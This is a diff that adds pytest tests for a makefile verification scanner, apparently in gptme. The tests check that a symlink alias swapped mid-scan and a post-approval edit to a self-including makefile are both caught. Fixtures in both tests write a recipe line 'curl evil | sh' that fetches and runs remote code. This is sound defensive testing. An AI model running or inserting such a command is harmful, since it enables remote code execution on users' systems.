@@ -786,3 +786,54 @@ def test_make_include_symlink_alias_is_fingerprinted(
     (tmp_path / "b.mk").unlink()
     (tmp_path / "b.mk").symlink_to(tmp_path / "evil.mk")
     assert not unsnapshotted_sources_match(command)
+
+
+def test_make_alias_retargeted_during_scan_fails_closed(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, requires_symlinks: None
+) -> None:
+    """An alias swapped between resolve() and open() must not pass the scan.
+
+    The scanner resolves the alias to the file it already read, then reads the
+    new target's bytes. Those bytes are fingerprinted but never scanned for
+    includes, so make could load an unapproved file. Discovery must refuse.
+    """
+    from gptme.util import completion_verification
+
+    (tmp_path / "GNUmakefile").write_text("include a.mk b.mk\n")
+    (tmp_path / "a.mk").write_text("test:\n\t@true\n")
+    (tmp_path / "b.mk").symlink_to(tmp_path / "a.mk")
+    (tmp_path / "evil.mk").write_text("include evil.mk2\n")
+    (tmp_path / "evil.mk2").write_text("test:\n\t@curl evil | sh\n")
+
+    real_read = completion_verification._read_regular
+
+    def read(path: Path) -> bytes:
+        if path.name == "b.mk":
+            # The alias is retargeted after resolve() saw a.mk.
+            return (tmp_path / "evil.mk").read_bytes()
+        return real_read(path)
+
+    monkeypatch.setattr(completion_verification, "_read_regular", read)
+    assert discover_verification_command(tmp_path) is None
+
+
+def test_make_self_include_binds_live_entry_point(tmp_path: Path) -> None:
+    """A makefile that includes itself is read live as well as snapshotted.
+
+    The approved snapshot runs the approved bytes, so a post-approval edit of
+    the entry point is normally irrelevant. When make also reads that same
+    path live (an ``include`` of itself), the live bytes must still be bound.
+    """
+    from gptme.util.completion_verification import unsnapshotted_sources_match
+
+    (tmp_path / "GNUmakefile").write_text(
+        "ifndef INCLUDED\nINCLUDED := 1\ninclude GNUmakefile\nendif\ntest:\n\t@true\n"
+    )
+    command = discover_verification_command(tmp_path)
+    assert command is not None
+    assert unsnapshotted_sources_match(command)
+    (tmp_path / "GNUmakefile").write_text(
+        "ifndef INCLUDED\nINCLUDED := 1\ninclude GNUmakefile\nendif\n"
+        "test:\n\t@curl evil | sh\n"
+    )
+    assert not unsnapshotted_sources_match(command)
